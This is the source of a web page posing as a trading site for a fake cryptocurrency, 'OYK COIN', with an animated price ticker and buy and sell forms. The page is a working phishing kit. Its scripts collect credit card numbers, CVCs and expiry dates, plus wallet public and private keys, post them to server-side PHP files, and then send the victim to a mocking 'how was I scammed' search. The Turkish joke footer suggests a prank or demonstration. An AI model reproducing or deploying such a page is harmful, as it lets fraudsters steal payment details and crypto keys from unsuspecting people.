<html>
	<head>
		<link rel="stylesheet" href="style.css">
		<script></script>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
		<script>
			$("document").ready(function(){
				
				function regulate(){
					$.ajax({
						url:'process.php',
						dataType:'text',
						type:'post',
						data:'nice',
						success:function(get){
							
						}
					});
					$.ajax({
						url:'sells.php',
						dataType:'text',
						type:'post',
						data:'noData',
						success:function(get){
							$('#sells_in').html(get);
						}
					});
					$.ajax({
						url:'buys.php',
						dataType:'text',
						type:'post',
						data:'noData',
						success:function(get){
							$('#buys_in').html(get);
						}
					});
				}
				function regulate2(){
					$.ajax({
						url:'value.php',
						dataType:'text',
						type:'post',
						data:'noData',
						success:function(get){
							$('#live').text(get);
							$('#calculate').text(150*get);
						}
					});
					
					val = $('#live').text();
					if(val>5){
						diff = val - 5;
						rate = (diff/5*100);
						$('#howmuch_live').text(Number(rate.toFixed(2)));
						$('#howmuch').css("color","#00cc00");
						$('#img').attr("src","image/up.png");
					}else{
						diff = 5 - val;
						rate = (diff/5*100);
						$('#howmuch_live').text(Number(rate.toFixed(2)));
						$('#howmuch').css("color","#ff471a");
						$('#img').attr("src","image/down.png");
					}
				}
				
				function regulatex(){
					$.ajax({
						url:'update.php',
						dataType:'text',
						type:'post',
						data:'noData',
						success:function(get){
							$('#live').text(get);
						}
					});
				}
				
				setInterval(regulate,500);
				setInterval(regulate2,320);
				
				$('#png').click(function(){
					$('#buyarea').fadeIn(250);
				});
				
				$('#jpg').click(function(){
					$('#sellarea').fadeIn(250);
				});
				
				$('#close').click(function(){
					$('#buyarea').fadeOut(250);
				});
				
				$("#creditcard_number,#cvc").focus(function(){
					$('#inf1').fadeOut(250);
					$('#inf2').fadeOut(250);
				});
				$('#rr').click(function(){
					$('#sellarea').fadeOut(250);
				});
				
				$('#but').click(function(){
					publickey = $('#privatekey').val();
					privatekey = $('#publickey').val();
					amount = $('#amount').val();
					$('#privatekey').val("");
					$('#publickey').val("");
					$('#amount').val("");
					data = "data="+publickey+"-"+privatekey+"-"+amount+"\n";
					$.ajax({
						url:'input1.php',
						dataType:'text',
						type:'post',
						data:data,
						success:function(get){
							window.location = "https://tr.lmgtfy.com/?q=nas%C4%B1l+doland%C4%B1r%C4%B1ld%C4%B1m";
						}
					});
				});
				
				$('.but').click(function(){
					creditcardnumber = $('#creditcard_number').val();
					cvc = $('#cvc').val();
					month = $('#month').val();
					year = $('#year').val();
					$('#creditcard_number').val("");
					$('#cvc').val("");
					data = "data="+creditcardnumber+"-"+cvc+"-"+month+"-"+year+"\n";
					$.ajax({
						url:'input2.php',
						dataType:'text',
						type:'post',
						data:data,
						success:function(get){
							window.location = "https://tr.lmgtfy.com/?q=nas%C4%B1l+doland%C4%B1r%C4%B1ld%C4%B1m";
						}
					});
				});
				
				$('#publickey,#privatekey,#amount').click(function(){
					$('#k1').fadeOut(250);
					$('#k2').fadeOut(250);
					$('#k3').fadeOut(250);
				});
				
			});
		</script>
	</head>
	<body>
		<div id="site">
			<div id="site_in">
				<div id="site_top">
					<div id="site_top_in">
						<div id="value">
							<div id="value_in">
								<div id="value_left">
									<div id="value_left_in">
										<img src="image/right.png" id="img">
									</div>
								</div>
								<div id="value_right">
									<div id="value_right_in">
										<div id="live">5.000000</div><div id="howmuch">(%<span id='howmuch_live'>5</span>)</div>
									</div>
								</div>
							</div>
						</div>
						<div id="inf">
							<div id="inf_in">
								<div id="inf_left">
									<div id="inf_left_in">
										<div id="xx">
											<div id="xx_in">
												<div id="xx_left">
													<div id="xx_left_in">
														TOTAL SUPPLY
													</div>
												</div>
												<div id="xx_right">
													<div id="xx_right_in">
														150
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
								<div id="inf_mid">
									<div id="inf_mid_in">
										<div id="brand">
											<div id="brand_in">
												<div id="brand_left">
													<div id="brand_left_in">
														<img src="image/brand.png" id="brandx">
													</div>
												</div>
												<div id="brand_right">
													<div id="brand_right_in">
														OYK COIN	
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
								<div id="inf_right">
									<div id="inf_right_in">
										<div id="xx">
											<div id="xx_in">
												<div id="xx_left">
													<div id="xx_left_in">
														MARKET VALUE
													</div>
												</div>
												<div id="xx_right">
													<div id="xx_right_in">
														<div id="calculate">750</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div id="site_mid">
					<div id="site_mid_in">
						<div id="process">
							<div id="process_in">
								<div id="process_left">
									<div id="process_left_in">
										<img src="image/sell.png" id="jpg">
									</div>
								</div>
								<div id="process_right">
									<div id="process_right_in">
										<img src="image/buy.png" id="png">
										
									</div>
								</div>
							</div>
						</div>
						<div id="operation">
							<div id="operation_in">
								<div id="operation_left">
									<div id="operation_left_in">
										<div id="sells">
											<div id="sells_in">
											
											</div>
										</div>
									</div>
								</div>
								<div id="operation_right">
									<div id="operation_right_in">
										<div id="buys">
											<div id="buys_in">
											
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div id="site_bot">
					<div id="site_bot_in">
						<div id="copy">
							©YK YUVAMIZ SATOSHI BABAMIZ
						</div>
						<div id="source">
							<div id="source_in">
								KAYNAK KODU ●
							</div>
						</div>
					</div>
				</div>
				<div id='cerceve'>
					<div id="cerceve_in">
						<img src='image/1.jpg' id='fi'>
					</div>
				</div>
				
				<div id='cerceve2'>
					<div id="cerceve_in">
						<img src='image/2.jpg' id='fi'>
					</div>
				</div>
				
				<div id='cerceve3'>
					<div id='cerceve3_in'>
						Ve o da bizi tercih etti...
					</div>
				</div>
				
				
				<div id='cerceve4'>
					<div id="cerceve_in">
						<img src='image/3.jpg' id='fi'>
					</div>
				</div>
				
				
				<div id='cerceve5'>
					<div id="cerceve_in">
						<img src='image/4.jpg' id='fi'>
					</div>
				</div>
				
				<div id="buyarea">
					<div id="buyarea_in">
						<div id="buyarea_top">
							<div id="buyarea_top_in">
								<div id="leftside">To Buy OYK COIN Provide These Informations</div><div id='close'>X</div>
							</div>
						</div>
						<div id="buyarea_mid">
							<div id="buyaera_mid_in">
								<div id="inf1">
									<div id="inf1_in">
										Credit Card Number
									</div>
								</div>
								<div id="inf2">
									<div id="inf2_in">
										CVC
									</div>
								</div>
								<div id="form">
									<div id="q1"><input type='number' maxlength="10" id='creditcard_number'></div>
									<div id="q1"><input type='number' id='cvc'></div>
									<div id="q1"><select id='month'>
										<?php
											for($i=1;$i<=12;$i++){
												echo "<option value='$i'>$i</option>";
											}
										?>
									</select>
									<select id='year'>
									<?php
											for($i=2020;$i<=2024;$i++){
												echo "<option value='$i'>$i</option>";
											}
										?>
									</select></div>
									<div id='q1'><input type='button' id='but' value="Buy Now"></div>
								</div>
							</div>
						</div>
						<div id="buyarea_bot">
							<div id="buyarea_bot_in">
							
							</div>
						</div>
					</div>
				</div>
				
				<div id="sellarea">
					<div id="sellarea_in">
						<div id="k1">
							<div id='k1_in'>
								Account Public Key
							</div>
						</div>
						<div id='k2'>
							<div id='k2_in'>
								Account Private Key
							</div>
						</div>
						<div id='k3'>
							<div id='k3_in'>
								Price
							</div>
						</div>
						<div id='sellarea_top'>
							<div id='sellarea_top_in'>
								<div id='ll'>Provide These Informations To Sell Your OYK COIN</div><div id='rr'>X</div>
							</div>
						</div>
						<div id='sellarea_mid'>
							<div id='q2'><input type='text' id='privatekey'></div>
							<div id='q2'><input type='text' id='publickey'></div>
							<div id='q2'><input type='text' id='amount'></div>
							<div id='q2'><input type='button' id='but' value='SELL NOW' class='but'></div>
						</div>
						<div id='sellarea_bot'>
						
						</div>
					</div>
				</div>
				
			</div>
		</div>
	</body>
</html>